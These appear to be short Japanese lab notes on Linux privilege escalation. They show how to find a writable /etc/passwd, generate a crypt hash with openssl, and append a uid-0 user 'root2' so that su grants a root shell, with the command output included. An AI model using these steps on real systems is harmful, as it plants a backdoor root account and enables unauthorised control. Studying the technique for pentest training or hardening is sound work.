# /etc/passwd 

/etc/passwdのユーザーレコードの2列目にパスワードハッシュが存在する場合、それは認証に有効とみなされ、/etc/shadowのそれぞれのエントリーがある場合はそちらに優先される

* opensslとpasswdの引数の助けを借りて、パスワードハッシュを生成する。デフォルトでは、他のオプションが指定されていない場合、opensslはLinux認証でサポートされているハッシュ・メカニズムであるcryptアルゴリズム1を使ってハッシュを生成する

  ```
  find / -writable -type f 2>/dev/null
  ```
  
  のコマンドで/etc/passwdが編集できる前提
  
  ```bash
  openssl passwd evil
  fRCncW12oa0wk
  ```
  
  ```bash
  student@debian:/var/scripts$ echo "root2:fRCncW12oa0wk:0:0:root:/root:/bin/bash" >> /etc/passwd
  student@debian:/var/scripts$ su root2
  Password: 
  root@debian:/var/scripts# id
  uid=0(root) gid=0(root) groups=0(root)
  ```
  
  